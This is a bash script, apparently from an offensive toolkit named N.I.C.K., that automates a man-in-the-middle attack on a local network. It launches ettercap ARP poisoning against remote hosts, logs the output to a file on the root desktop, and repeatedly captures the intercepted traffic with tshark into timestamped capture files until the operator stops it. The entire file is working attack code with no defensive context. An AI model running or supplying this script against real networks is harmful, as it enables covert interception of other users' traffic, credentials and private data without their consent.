#!/bin/bash

#    This file is part of N.I.C.K.

#    N.I.C.K is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.

#    N.I.C.K is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.

#    You should have received a copy of the GNU General Public License
#    along with N.I.C.K.  If not, see <http://www.gnu.org/licenses/>.


BOLD='\e[32;1m'
PLN='\e[0m'
RED='\033[32;31m'
GRN='\033[0;32m'
NC='\033[0m'
BLU='\033[1;34m'


airmon-ng ;
echo -e "[+] Select a ${GRN}Interface${NC} for unified sniffing"
read interface;
echo -e "\n[+] Enter the ${GRN}path${NC} to store the output files"
read capfile
folder_name=$(date +"%Y%m%d")
folder_name="$capfile/$folder_name"
status=0;
if [ ! -d $folder_name ];
then
  mkdir $folder_name;
fi
status=1;
xterm -title ARP_POISONING -e ettercap -Tq -i $interface  -M arp:remote > /root/Desktop/log.txt &
while [ $status -ne 0 ]
do
  file_name=$(date +"%H%M");
  file_name="$folder_name/$file_name"
  xterm -title FILE_CAPTURE -e tshark -i $interface -c 800000 -w $file_name ;
  zenity --question --timeout 10 --text="Do you want to stop the capturing" 2> /dev/null;
  if [ $? -eq 0 ];
  then
    status=0;
    echo -e "${BOLD}${RED}Exitting${NC}${PLN}"
    exit;
  fi;
done
